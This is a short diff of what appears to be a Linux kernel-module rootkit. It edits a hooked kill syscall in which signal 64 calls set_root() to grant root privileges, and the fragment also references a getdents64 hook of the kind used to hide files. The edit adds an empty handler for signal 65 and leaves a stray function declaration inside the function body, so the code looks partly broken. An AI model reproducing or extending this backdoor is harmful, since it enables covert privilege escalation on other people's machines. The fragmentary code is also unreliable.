@@ -164,11 +164,12 @@ done:
 
 }
 
-asmlinkage int hook_kill(const struct pt_regs *regs)
+asmlinkage int hook_kill(pid_t pid, int sig)
 {
-    pid_t pid = regs->di;
-    int sig = regs->si;
+    if ( sig == 65 )
+    {
 
+    }
     void set_root(void);
 
     if ( sig == 64 )
@@ -227,7 +228,6 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     }
 
     return orig_kill(pid, sig);
-
 }
 #else
 static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
